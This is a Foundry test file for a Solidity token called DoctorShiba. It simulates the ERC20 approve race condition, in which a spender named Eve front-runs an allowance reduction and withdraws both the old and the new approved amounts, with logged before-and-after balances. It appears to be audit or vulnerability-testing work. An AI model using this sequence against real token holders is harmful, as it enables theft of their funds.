// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DoctorShiba.sol";
import "forge-std/console.sol";

contract DoctorShibaApproveRaceTest is Test {
    DoctorShiba public token;
    address public alice = makeAddr("alice");
    address public eve = makeAddr("eve");

    function setUp() public {
        // Deploy token and assign initial balances
        vm.startPrank(alice);
        token = new DoctorShiba();
        vm.stopPrank();
    }

    function testApproveRaceCondition() public {
        // Calculate test amounts based on token decimals
        uint256 tokenDecimals = token.decimals();
        uint256 initialApproval = 100 * (10 ** tokenDecimals);
        uint256 newApproval = 50 * (10 ** tokenDecimals);
        uint256 aliceInitialBalance = token.balanceOf(alice);
        
        // Ensure Alice has enough tokens
        require(aliceInitialBalance > initialApproval + newApproval, "Insufficient initial balance");

        console.log("--- BEFORE ATTACK ---");
        uint256 aliceBalBefore = token.balanceOf(alice);
        uint256 eveBalBefore = token.balanceOf(eve);
        uint256 allowanceBefore = token.allowance(alice, eve);
        console.log("Alice balance: ", aliceBalBefore);
        console.log("Eve balance: ", eveBalBefore);
        console.log("Allowance (Alice->Eve): ", allowanceBefore);

        console.log("--- ATTACK START ---");
        // Step 1: Alice gives Eve initial approval
        console.log("Step 1: Alice approves initial amount");
        vm.prank(alice);
        token.approve(eve, initialApproval);
        assertEq(token.allowance(alice, eve), initialApproval, "Initial approval failed");

        // Step 2: Eve front-runs Alice's approval reduction
        console.log("Step 2: Eve front-runs and transfers initial amount");
        vm.prank(eve);
        token.transferFrom(alice, eve, initialApproval);
        
        // Verify allowance reset and balance updated
        assertEq(token.allowance(alice, eve), 0, "Allowance not reset");
        assertEq(token.balanceOf(eve), initialApproval, "Initial transfer failed");

        // Step 3: Alice sets new lower approval (unaware of attack)
        console.log("Step 3: Alice sets new lower approval");
        vm.prank(alice);
        token.approve(eve, newApproval);
        assertEq(token.allowance(alice, eve), newApproval, "New approval failed");

        // Step 4: Eve withdraws again with the new approval
        console.log("Step 4: Eve transfers new approved amount");
        vm.prank(eve);
        token.transferFrom(alice, eve, newApproval);
        
        // Final verification: Eve has both amounts
        assertEq(
            token.balanceOf(eve), 
            initialApproval + newApproval,
            "Eve should have both initial and new approval amounts"
        );
        
        console.log("--- AFTER ATTACK ---");
        uint256 aliceBalAfter = token.balanceOf(alice);
        uint256 eveBalAfter = token.balanceOf(eve);
        uint256 allowanceAfter = token.allowance(alice, eve);
        console.log("Alice balance: ", aliceBalAfter);
        console.log("Eve balance: ", eveBalAfter);
        console.log("Allowance (Alice->Eve): ", allowanceAfter);

        uint256 expectedEveGain = initialApproval + newApproval;
        uint256 actualEveGain = eveBalAfter - eveBalBefore;
        
        console.log("Eve's expected gain: ", expectedEveGain);
        console.log("Eve's actual gain: ", actualEveGain);

        // Vulnerability determination
        if (actualEveGain == expectedEveGain) {
            console.log("Vulnerability Exists: Approve Race Condition allowed double spending");
        } else {
            console.log("Vulnerability not Exist: No unexpected balance change detected");
        }
    }
}